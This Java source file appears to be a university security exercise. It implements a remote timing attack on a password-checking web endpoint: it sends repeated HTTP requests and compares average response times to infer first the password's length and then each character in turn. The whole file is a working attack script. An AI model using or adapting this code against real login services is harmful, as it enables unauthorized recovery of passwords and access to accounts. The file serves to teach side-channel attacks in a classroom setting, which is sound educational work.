import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static java.lang.System.exit;


public class ex01_M2 {

    // Const
    public static int NANOSECONDS_IN_MILLISECONDS = 1000000;

    // Configuration
    public static int MIN_PASSWORD_LENGTH = 1;
    public static int MAX_PASSWORD_LENGTH = 32;
    public static int CHECK_PASSWORD_LENGTH_ATTEMPTS = 1;
    public static int CHECK_PASSWORD_CHARS_ATTEMPTS = 1;
    public static int DEBUG_MESSAGE_COUNT = 1;
    public static boolean DEBUG_MESSAGE = true;
    public static int DIFFICULTY = 1;
    public static String USER_ID = "ID";
    public static float MIN_RATIO = 1.05f;
    public static float MAX_RATIO = 150f;

    // Flags
    public static long FOUND_THE_PASSWORD = -1;
    public static long ERROR_WHILE_CHECK_TIME = 0;


    /*
     Returns the current value of the most precise available system timer, in nanoseconds(10^-9 seconds).
     */
    public static long getCurrentTime() {
        return System.nanoTime();
    }

    public static long checkResponseTime(String url) {
        long start, end;
        try {
            URL site = new URL(url);
            URLConnection conn = site.openConnection();
            conn.setDoInput(true);

            start = getCurrentTime();
            conn.connect();
            end = getCurrentTime();

            InputStream stream = conn.getInputStream();
            byte[] bytesBody={0};
            stream.read(bytesBody);
            String body = new String(bytesBody);

            if("1".equals(body)){
                System.out.println(url);
                return FOUND_THE_PASSWORD;
            }

        } catch (MalformedURLException e) {
            if(DEBUG_MESSAGE) {
                System.out.println("Invalid URL Format:");
                System.out.println(url);
            }
            return ERROR_WHILE_CHECK_TIME;
        } catch (IOException e) {
            if(DEBUG_MESSAGE) {
                System.out.println("Failed connect to the URL server:");
                System.out.println(url);
            }
            return ERROR_WHILE_CHECK_TIME;
        }

        return end - start;
    }

    public static String buildUrlFromPassword(String password)
    {
        return String.format("http://aoi.ise.bgu.ac.il/?user=%s&password=%s&difficulty=%d", USER_ID, password, DIFFICULTY);
    }

    public static void foundTheRightPassword(String password)
    {
        System.out.println(USER_ID + " " + password + " " + DIFFICULTY);
        exit(0);
    }

    public static class PossiblePasswordData {
        Integer passwordAttempts;
        Long passwordSumTime;
        Integer passwordErrors;
        double passwordResponseAverage;

        public PossiblePasswordData()
        {
            passwordAttempts = 0;
            passwordSumTime = 0L;
            passwordErrors = 0;
            passwordResponseAverage = 0;
        }
    }

    public static Map<String, PossiblePasswordData> executeTimingAttack(List<String> passwordsToCheck, int numberOfAttempts, Boolean debug)
    {
        Map<String, PossiblePasswordData> result = new HashMap<String, PossiblePasswordData>();
        long responseTime;

        for (String password : passwordsToCheck) {
            result.put(password, new PossiblePasswordData());
        }

        // first call to do some setup in java:
        checkResponseTime(buildUrlFromPassword("123"));

        for (int i = 0; i < numberOfAttempts; i++)
        {
            if (debug && (i % (CHECK_PASSWORD_LENGTH_ATTEMPTS / DEBUG_MESSAGE_COUNT) == 0))
            {
                System.out.println(String.format("checked %d", i));
            }

            for (String password : passwordsToCheck) {
                responseTime = checkResponseTime(buildUrlFromPassword(password));

                if (responseTime == FOUND_THE_PASSWORD)
                {
                    foundTheRightPassword(password);
                }
                else if (responseTime == ERROR_WHILE_CHECK_TIME)
                {
                    result.get(password).passwordErrors += 1;
                }
                else
                {
                    result.get(password).passwordAttempts += 1;
                    result.get(password).passwordSumTime += responseTime;
                }

            }
        }

        return result;
    }

    public static boolean validateAttackResults(Map<String, PossiblePasswordData> results, int checksAttempts)
    {
        for (String password : results.keySet())
        {
            if(results.get(password).passwordErrors == checksAttempts) {
                if( DEBUG_MESSAGE) {
                    System.out.println("There is password that all http request attempts failed!");
                }
                return false;
            }
        }
        return true;
    }


    public static class TimingAttackResult {

        public String password;
        public Double ratio;

        public TimingAttackResult(String password, Double ratio) {
            this.password = password;
            this.ratio = ratio;
        }

    }


    public static void calculateAverageForEachPossiblePassword(Map<String, PossiblePasswordData> results)
    {
        for (String password: results.keySet()) {
            results.get(password).passwordResponseAverage = results.get(password).passwordSumTime / results.get(password).passwordAttempts;
        }
    }

    public static double calculateTotalAverageWithoutOnePassword(Map<String, PossiblePasswordData> results, String passwordToIgnore)
    {
        double totalSum = 0;
        for (String password: results.keySet()) {
            if(password.equals(passwordToIgnore)){
                continue;
            }
            totalSum += results.get(password).passwordResponseAverage;
        }
        return totalSum / (results.size() - 1);
    }

    public static List<TimingAttackResult> calculateNBiggestRatio(int nPosition, Map<String, PossiblePasswordData> results)
    {
        List<TimingAttackResult> nBiggestRatio = new ArrayList<TimingAttackResult>();

        for (int i = 0; i < nPosition; i++) {

            Map<String, PossiblePasswordData> resultsWithoutCalculatedRatio = new HashMap<String, PossiblePasswordData>();
            for (String password: results.keySet()) {

                boolean passwordAlreadyIncluded = false;
                for (TimingAttackResult includedPassword : nBiggestRatio) {
                    if (password.equals(includedPassword.password)) {
                        passwordAlreadyIncluded = true;
                    }
                }
                if (passwordAlreadyIncluded){
                    continue;
                }
                resultsWithoutCalculatedRatio.put(password, results.get(password));
            }

            String maxRatioPassword = resultsWithoutCalculatedRatio.keySet().iterator().next();
            double maxRatio = resultsWithoutCalculatedRatio.get(maxRatioPassword).passwordResponseAverage / calculateTotalAverageWithoutOnePassword(resultsWithoutCalculatedRatio, maxRatioPassword);
            for (String password: resultsWithoutCalculatedRatio.keySet()) {
                double currentRatio = resultsWithoutCalculatedRatio.get(password).passwordResponseAverage / calculateTotalAverageWithoutOnePassword(resultsWithoutCalculatedRatio, password);
                if (currentRatio > maxRatio){
                    maxRatio = currentRatio;
                    maxRatioPassword = password;
                }
            }

            nBiggestRatio.add(new TimingAttackResult(maxRatioPassword, maxRatio));
        }

        return nBiggestRatio;
    }

    public static int checkPasswordLength() {
        List<String> possiblePasswords = new ArrayList<String>();

        for (int i = MIN_PASSWORD_LENGTH ; i <= MAX_PASSWORD_LENGTH ; i++)
        {
            possiblePasswords.add(new String(new char[i]).replace("\0", "a"));
        }

        boolean foundLength = false;
        int length = 0;
        while (!foundLength) {
            boolean attackSucceed = false;
            Map<String, PossiblePasswordData> results = null;
            while (!attackSucceed) {
                results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_LENGTH_ATTEMPTS, DEBUG_MESSAGE);
                attackSucceed = validateAttackResults(results, CHECK_PASSWORD_LENGTH_ATTEMPTS);
            }
            calculateAverageForEachPossiblePassword(results);

            for (String password : possiblePasswords) {
                if (DEBUG_MESSAGE) {
                    System.out.println(String.format("Length %d took %f milliseconds", password.length(), results.get(password).passwordResponseAverage / NANOSECONDS_IN_MILLISECONDS));
                }
            }

            List<TimingAttackResult> ratio = calculateNBiggestRatio(3, results);
            length = ratio.get(0).password.length();
            if (DEBUG_MESSAGE) {
                System.out.println(String.format("Length %d bigger then other by %f times", length, ratio.get(0).ratio));
                System.out.println(String.format("Length %d bigger then other by %f times", ratio.get(1).password.length(), ratio.get(1).ratio));
                System.out.println(String.format("Length %d bigger then other by %f times", ratio.get(2).password.length(), ratio.get(2).ratio));
            }

            if (ratio.get(0).ratio < MAX_RATIO && ratio.get(0).ratio > MIN_RATIO) {
                foundLength = true;
            }
        }

        return length;
    }

    public static String checkThePassword(int passwordLength)
    {
        char[] availablePasswordChar = new char[]{'0','1','2','3','4','5','6','7','8','9', 'a','b','c','d','e','f','g',
                'h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G',
                'H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};

        String charactersFoundFromPassword = "";
        for (int currentPasswordIndex = 0; currentPasswordIndex < passwordLength; currentPasswordIndex++)
        {
            List<String> possiblePasswords = new ArrayList<String>();
            for (char someChar: availablePasswordChar)
            {
                String password = String.format("%s%c%s", charactersFoundFromPassword, someChar,
                        new String(new char[passwordLength - currentPasswordIndex - 1]).replace("\0", "a"));

                possiblePasswords.add(password);
            }

            boolean foundNextChar = false;
            char nextChar;
            while(!foundNextChar) {
                boolean attackSucceed = false;
                Map<String, PossiblePasswordData> results = null;
                while (!attackSucceed) {
                    results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_CHARS_ATTEMPTS, DEBUG_MESSAGE);
                    attackSucceed = validateAttackResults(results, CHECK_PASSWORD_CHARS_ATTEMPTS);
                }
                calculateAverageForEachPossiblePassword(results);

                for (String password : possiblePasswords) {
                    if (DEBUG_MESSAGE) {
                        System.out.println(String.format("char %c took %f milliseconds", password.charAt(currentPasswordIndex), results.get(password).passwordResponseAverage / NANOSECONDS_IN_MILLISECONDS));
                    }
                }

                List<TimingAttackResult> ratio = calculateNBiggestRatio(3, results);
                nextChar = ratio.get(0).password.charAt(currentPasswordIndex);

                if (DEBUG_MESSAGE) {
                    System.out.println(String.format("char %c bigger then other by %f times", ratio.get(0).password.charAt(currentPasswordIndex), ratio.get(0).ratio));
                    System.out.println(String.format("char %c bigger then other by %f times", ratio.get(1).password.charAt(currentPasswordIndex), ratio.get(1).ratio));
                    System.out.println(String.format("char %c bigger then other by %f times", ratio.get(2).password.charAt(currentPasswordIndex), ratio.get(2).ratio));
                }
                if (ratio.get(0).ratio < MAX_RATIO && ratio.get(0).ratio > MIN_RATIO) {
                    foundNextChar = true;
                    charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
                    if (DEBUG_MESSAGE) {
                        System.out.println(String.format("Password until now is %s", charactersFoundFromPassword));
                    }
                }
            }
        }

        return charactersFoundFromPassword;
    }

    public static void main(String[] args) {
        int passwordLength = checkPasswordLength();
        if(DEBUG_MESSAGE) {
            System.out.println(String.format("Password length is %d", passwordLength));
        }

        String password = checkThePassword(passwordLength);
        if(DEBUG_MESSAGE) {
            System.out.println(String.format("The password is %s", password));
        }

        foundTheRightPassword(password);
    }
}
